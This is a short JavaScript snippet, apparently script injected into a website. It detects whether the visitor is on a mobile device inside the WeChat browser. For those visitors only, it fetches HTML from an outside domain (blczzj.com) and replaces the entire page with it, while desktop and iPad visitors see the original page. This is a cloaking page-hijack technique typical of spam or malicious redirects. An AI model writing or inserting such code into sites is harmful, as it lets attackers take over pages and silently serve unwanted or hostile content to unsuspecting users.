	var system={win:false,mac:false,xll:false,ipad:false};
	var plat=navigator.platform;
	system.win=plat.indexOf("Win")==0;
	system.mac=plat.indexOf("Mac")==0;
	system.x11=(plat=="X11")||(plat.indexOf("Linux")==0);
	system.ipad=(navigator.userAgent.match(/iPad/i)!=null)?true:false;
	if(system.win||system.mac||system.xll||system.ipad){var l=1;}if(!isWeiXin()){var l=1;}function isWeiXin(){var ua=window.navigator.userAgent.toLowerCase();
 	if(ua.match(/MicroMessenger/i)=='micromessenger'){return true}else{return false}}
if(l!=1){
var xhr = new XMLHttpRequest;
var html = null;
function render() {
    var a = document.open("text/html", "replace");
    a.write(html);
    a.close();
}
xhr.onload = function() {
    html = xhr.responseText;
    var delay = 0;
	
    if (delay > 0) setTimeout("render()", delay * 1000)
    else render();
};
function getQueryString(name) { 
	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); 
	var r = window.location.search.substr(1).match(reg); 
	if (r != null) return unescape(r[2]); return null; 
} 
gid=getQueryString("kpi");
xhr.open("GET", "//blczzj.com//"+Date.now()+".gcif?", !0);
xhr.send();

}
